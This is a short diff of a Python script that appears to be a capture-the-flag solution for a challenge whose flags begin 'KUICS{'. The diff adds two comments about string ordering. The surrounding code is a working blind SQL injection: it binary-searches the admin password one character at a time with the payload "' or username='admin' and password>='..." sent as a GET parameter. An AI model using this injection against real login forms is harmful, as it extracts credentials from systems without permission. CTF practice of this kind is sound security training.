@@ -9,6 +9,9 @@ while True:
     while(s<=e):
         mid = (s+e)//2
         
+        # "KUICS{}" < "a"
+        # "guest" > "a"
+        
         payload = f"' or username='admin' and password>='{res+chr(mid)}"
         
         response = requests.get(url=url, params={"password":payload})
